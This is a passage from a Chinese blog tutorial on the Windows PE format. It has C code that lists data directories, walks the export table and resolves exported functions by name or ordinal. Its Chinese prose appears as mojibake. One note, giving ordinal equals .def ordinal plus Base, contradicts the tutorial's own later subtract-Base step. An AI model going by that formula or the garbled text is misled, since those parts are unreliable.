class="hljs-string">&quot;RESOURCE Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">3</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EXCEPTION Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SECURITY Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BASERELOC Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">6</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DEBUG Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">7</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;COPYRIGHT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">8</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GLOBALPTR Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">9</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TLS Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">10</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LOAD_CONFIG Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i ==<span class="hljs-number">11</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BOUND_IMPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">12</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IAT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">13</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DELAY_IMPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">14</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;COM_DESCRIPTOR Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">15</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reserved Directory:\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RVA: %X\nSize: %X\n=====================&quot;</span>, *(Data_Directory + <span class="hljs-number">2</span> * i), *(Data_Directory + <span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    <span class="hljs-comment">//å°†æ–‡ä»¶è¯»å–åˆ°ç¨‹åºä¸­</span><br>    <span class="hljs-type">int</span> size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    Data_Directoy(buffer);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å¯¼å‡ºè¡¨"><a href="#å¯¼å‡ºè¡¨" class="headerlink" title="å¯¼å‡ºè¡¨"></a>å¯¼å‡ºè¡¨</h2><h3 id="ä»€ä¹ˆæ˜¯å¯¼å‡ºè¡¨"><a href="#ä»€ä¹ˆæ˜¯å¯¼å‡ºè¡¨" class="headerlink" title="ä»€ä¹ˆæ˜¯å¯¼å‡ºè¡¨"></a>ä»€ä¹ˆæ˜¯å¯¼å‡ºè¡¨</h3><p>ä¸€ä¸ªexeä¸­ï¼Œå¯èƒ½ä¼šåŠ¨æ€é“¾æ¥ä¸€äº›åº“ï¼Œé‚£ä¹ˆè¿™äº›åº“å°±å¾—å‘Šè¯‰åˆ«çš„exeæœ‰ä»€ä¹ˆå‡½æ•°å¯ä»¥ä¾›å…¶ä½¿ç”¨ï¼Œè¦å‘ŠçŸ¥åˆ«çš„exeè¿™äº›å‡½æ•°ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚åå­—ã€åœ°å€ç­‰ç­‰ï¼Œå› æ­¤å°±éœ€è¦ä¸€å¼ è¡¨æ¥è®°å½•è¿™äº›ä¿¡æ¯ï¼Œå°±ç›¸å½“äºæ˜¯ä¸€ä¸ªæŒ‡å—ï¼Œå‘Šè¯‰åˆ«äººæˆ‘èƒ½æä¾›ä»€ä¹ˆå‡½æ•°ï¼Œä½ å¯ä»¥æ€æ ·æ‰¾åˆ°è¿™äº›å‡½æ•°ã€‚IMAGE_DATA_DIRECTORYçš„ç¬¬ä¸€ä¸ªæˆå‘˜æŒ‡å‘çš„å°±æ˜¯å¯¼å‡ºè¡¨ã€‚</p><p>ç„¶è€Œè¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯DLLæ‰æœ‰å¯¼å‡ºè¡¨ï¼ŒexeåŒæ ·ä¹Ÿå¯ä»¥æœ‰å¯¼å‡ºè¡¨ï¼Œå®ƒä¹Ÿèƒ½æä¾›å‡½æ•°ç»™åˆ«çš„exeä½¿ç”¨</p><h3 id="å¯¼å‡ºè¡¨ç»“æ„"><a href="#å¯¼å‡ºè¡¨ç»“æ„" class="headerlink" title="å¯¼å‡ºè¡¨ç»“æ„"></a>å¯¼å‡ºè¡¨ç»“æ„</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br>        DWORD   Characteristics;<span class="hljs-comment">//æ²¡ç”¨</span><br>        DWORD   TimeDateStamp;<span class="hljs-comment">//æ—¶é—´æˆ³</span><br>        WORD    MajorVersion;<span class="hljs-comment">//æ²¡ç”¨</span><br>        WORD    MinorVersion;<span class="hljs-comment">//æ²¡ç”¨</span><br>        DWORD   Name;<span class="hljs-comment">//æŒ‡å‘å¯¼å‡ºè¡¨æ–‡ä»¶å RVA --&gt;FOA+FileBuff=char *name;</span><br>        DWORD   Base;<span class="hljs-comment">//å¯¼å‡ºå‡½æ•°èµ·å§‹åºå·</span><br>        DWORD   NumberOfFunctions;<span class="hljs-comment">//å¯¼å‡ºå‡½æ•°ä¸ªæ•°</span><br>        DWORD   NumberOfNames;<span class="hljs-comment">//ä»¥åç§°å¯¼å‡ºå‡½æ•°ä¸ªæ•°</span><br>        DWORD   AddressOfFunctions;<span class="hljs-comment">//å¯¼å‡ºå‡½æ•°åœ°å€è¡¨ RVA--&gt;FOA +FileBuff         </span><br>DWORD   AddressOfNames;    <span class="hljs-comment">//å¯¼å‡ºå‡½æ•°åç§°è¡¨     // RVA from base of image</span><br>        DWORD   AddressOfNameOrdinals; <span class="hljs-comment">//å¯¼å‡ºå‡½æ•°åºå·è¡¨ // RVA from base of image</span><br>&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;<br></code></pre></td></tr></table></figure><ul><li><p>Name å­˜å‚¨æŒ‡å‘è‡ªå·±æ–‡ä»¶åå­—çš„åœ°å€ï¼Œæ˜¯ä¸€ä¸ªRVA</p></li><li><p>Base</p><p>åœ¨åˆ›é€ dllçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨defæ–‡ä»¶æ¥æ‰‹åŠ¨å†³å®šå¯¼å‡ºå‡½æ•°åºå·</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072055509.png"></p><p>å…¶ä¸­é‡Œé¢æœ€å°çš„é‚£ä¸ªåºå·å°±æ˜¯Baseã€‚è¿™é‡Œé¢çš„åºå·ä¹Ÿå¯ä»¥æ˜¯éšæ„çš„æ— åºçš„ï¼Œåºå·åé¢ï¼Œä¹Ÿå¯ä»¥å†åŠ ä¸€ä¸ªNONAMEï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°åœ¨å¯¼å‡ºçš„æ—¶å€™å°±ä¸ä¼šæœ‰åå­—ï¼Œåªèƒ½é€šè¿‡åºå·æ¥ä½¿ç”¨å®ƒã€‚</p></li><li><p>NumberOfFunctions å¯¼å‡ºå‡½æ•°ä¸ªæ•°ï¼Œæ˜¯æŒ‡æ‰€æœ‰å‡½æ•°çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬ä½¿ç”¨æ— åå‡½æ•°å¯¼å‡ºçš„</p></li><li><p>NumberOfNames ä»¥åå­—å¯¼å‡ºå‡½æ•°ä¸ªæ•°</p></li><li><p>AddressOfFunctionsï¼šå­˜å‚¨ä¸€ä¸ªRVAåœ°å€ï¼ŒæŒ‡å‘ä¸€å¼ å­˜æœ‰æ‰€æœ‰å‡½æ•°åœ°å€çš„è¡¨ï¼Œä¸ªæ•°ç”±NumberOfFunctionså†³å®šï¼Œä»¥ä¸‹ç§°ä¸ºåœ°å€è¡¨</p></li><li><p>AddressOfNamesï¼šå­˜å‚¨ä¸€ä¸ªRVAåœ°å€ï¼ŒæŒ‡å‘ä¸€å¼ å­˜æœ‰æ‰€æœ‰å‡½æ•°åå­—åœ°å€çš„è¡¨ï¼Œä¸ªæ•°ç”±NumberOfNames å†³å®šï¼Œä»¥ä¸‹ç§°ä¸ºåç§°åœ°å€è¡¨</p></li><li><p>AddressOfNameOrdinalsï¼šå­˜å‚¨ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘ä¸€å¼ å­˜æœ‰æ‰€æœ‰å‡½æ•°åºå·çš„è¡¨ï¼Œä¸ªæ•°ä¸AddressOfNamesç›¸åŒï¼Œä»¥ä¸‹ç§°ä¸ºåºå·è¡¨</p></li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072016159.png"></p><p>NOTEï¼š</p><ul><li><p>NumberOfFunctionsè®¡ç®—æ–¹å¼ã€‚ä¹‹å‰æåŠï¼Œåœ¨ä½¿ç”¨defå¯¼å‡ºå‡½æ•°åºå·æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥éšæ„å†³å®šå‡½æ•°åºå·ï¼Œè€ŒNumberOfFunctionså°±ä¾èµ–è¿™äº›åºå·è®¡ç®—ã€‚å…·ä½“åœ°ï¼Œå®ƒä¼šç”¨<strong>æœ€å¤§çš„åºå· - æœ€å°çš„åºå· + 1</strong>è¿™ä¸ªå…¬å¼æ¥è®¡ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒNumberOfFunctionså¹¶ä¸ä¸€å®šå°±æ˜¯å®é™…å¯¼å‡ºå‡½æ•°ä¸ªæ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072233229.jpg"></p></li><li><p>åœ°å€è¡¨ä¸åç§°åœ°å€è¡¨å¤§å°ä¸ä¸€å®šã€‚é€šå¸¸æƒ…å†µä¸‹åœ°å€è¡¨ä¼šå¤§äºåç§°åœ°å€è¡¨ï¼Œå› ä¸ºåœ°å€è¡¨æ˜¯ç”±æ‰€æœ‰å‡½æ•°åœ°å€ï¼Œåç§°è¡¨åªæ˜¯ä»¥åå­—å¯¼å‡ºçš„å‡½æ•°ã€‚ä½†ä¹Ÿæ˜¯ä¹Ÿå¯ä»¥è®©ä¸¤ä¸ªå‡½æ•°åå­—æŒ‡å‘åŒä¸€ä¸ªå‡½æ•°ï¼Œè¿™ç§æƒ…å†µä¸‹åç§°åœ°å€è¡¨å°±æœ‰å¯èƒ½å¤§äºåœ°å€è¡¨</p></li><li><p>åœ¨å¯¼å‡ºå‡½æ•°çš„æ—¶å€™å¯ä»¥é€šè¿‡ä½¿ç”¨defæ–‡ä»¶çš„æ–¹å¼æ›´æ”¹dllå‡½æ•°å¯¼å‡ºåºå·ï¼Œä½†æ˜¯defé‡Œçš„åºå·ä¸åºå·è¡¨é‡Œåºå·å¹¶ä¸æ˜¯ä¸€æ ·çš„ï¼Œè€Œæ˜¯åºå·è¡¨çš„åºå· &#x3D; defçš„åºå· + base</p></li><li><p>ä½¿ç”¨åå­—æ‰¾ä¸€ä¸ªå‡½æ•°æµç¨‹ã€‚ç°åœ¨è¦æ‰¾ä¸€ä¸ªåä¸ºâ€œADDâ€çš„å‡½æ•°ï¼Œå…¶æµç¨‹å¦‚ä¸‹</p><ul><li>éå†åç§°åœ°å€è¡¨ï¼Œä»ä¸­ä¸€ä¸ªä¸€ä¸ªæ¯”å¯¹ï¼Œæ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œå¾—åˆ°åç§°åœ°å€è¡¨çš„ç´¢å¼•</li><li>ä½¿ç”¨ç›¸åŒç´¢å¼•åœ¨åºå·è¡¨é‡Œå¾—åˆ°åºå·</li><li>ä»¥å¾—åˆ°çš„åºå·ä¸ºç´¢å¼•ï¼Œåœ¨åœ°å€è¡¨é‡Œå¾—åˆ°å‡½æ•°åœ°å€</li></ul></li><li><p>ä½¿ç”¨åºå·æ‰¾ä¸€ä¸ªå‡½æ•°æµç¨‹ã€‚ç°åœ¨è¦æ‰¾ä¸€ä¸ªåºå·10çš„å‡½æ•°ï¼Œå…¶æµç¨‹å¦‚ä¸‹</p><ul><li>ç›´æ¥ç”¨åºå·å‡baseå¾—åˆ°ç´¢å¼•</li><li>ä½¿ç”¨ç´¢å¼•åœ¨åœ°å€è¡¨é‡Œå¾—åˆ°å‡½æ•°åœ°å€</li></ul></li></ul><h3 id="éå†å¯¼å‡ºè¡¨"><a href="#éå†å¯¼å‡ºè¡¨" class="headerlink" title="éå†å¯¼å‡ºè¡¨"></a>éå†å¯¼å‡ºè¡¨</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">Export_Table</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Characteristics: %#x\n&quot;</span>, _Export_Table-&gt;Characteristics);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TimeDateStamp: %#x\n&quot;</span>, _Export_Table-&gt;TimeDateStamp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MajorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MajorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MinorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MinorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: %s\n&quot;</span>, (Buffer + RVA_TO_FOA(_Export_Table-&gt;Name, Buffer)));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base: %#x\n&quot;</span>, _Export_Table-&gt;Base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfNames: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNames: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNameOrdinals: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNameOrdinals);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========å‡½æ•°åœ°å€è¡¨ AddressOfFuncitons==========\n&quot;</span>);<br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfFunctions;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸‹æ ‡ï¼š%d å‡½æ•°åœ°å€ï¼š%x\n&quot;</span>, i , *(AddressOfFuncitons + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========åºå·è¡¨ AddressOfOrdinals==========\n&quot;</span>);<br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames; i++)<br>    &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸‹æ ‡ï¼š%d åºå·ï¼š%x\n&quot;</span>, i , *(AddressOfOrdinals + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========å‡½æ•°åç§°è¡¨ AddressOfNames==========\n&quot;</span>);<br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddres = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸‹æ ‡ï¼š%d å‡½æ•°åç§°ï¼š%s\n&quot;</span>, i ,nameaddres);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ ¹æ®å‡½æ•°åç§°æ‰¾å‡½æ•°"><a href="#æ ¹æ®å‡½æ•°åç§°æ‰¾å‡½æ•°" class="headerlink" title="æ ¹æ®å‡½æ•°åç§°æ‰¾å‡½æ•°"></a>æ ¹æ®å‡½æ•°åç§°æ‰¾å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByName</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">char</span>* name)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//å‡½æ•°åœ°å€è¡¨</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-comment">//åºå·è¡¨</span><br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-comment">//å‡½æ•°åç§°è¡¨</span><br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddr = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(name,nameaddr))&#123;<br>            <span class="hljs-type">int</span> ordinal = *(AddressOfOrdinals + i);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s found: %x\n&quot;</span>,name,*(AddressOfFuncitons + ordinal));<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Func Not Found\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æ ¹æ®å‡½æ•°åºå·æ‰¾å‡½æ•°"><a href="#æ ¹æ®å‡½æ•°åºå·æ‰¾å‡½æ•°" class="headerlink" title="æ ¹æ®å‡½æ•°åºå·æ‰¾å‡½æ•°"></a>æ ¹æ®å‡½æ•°åºå·æ‰¾å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByOrd</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">int</span> Ord)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//å‡½æ•°åœ°å€è¡¨</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-type">int</span> base = _Export_Table-&gt;Base;<br>    <span class="hljs-built_in">printf</span>(<span 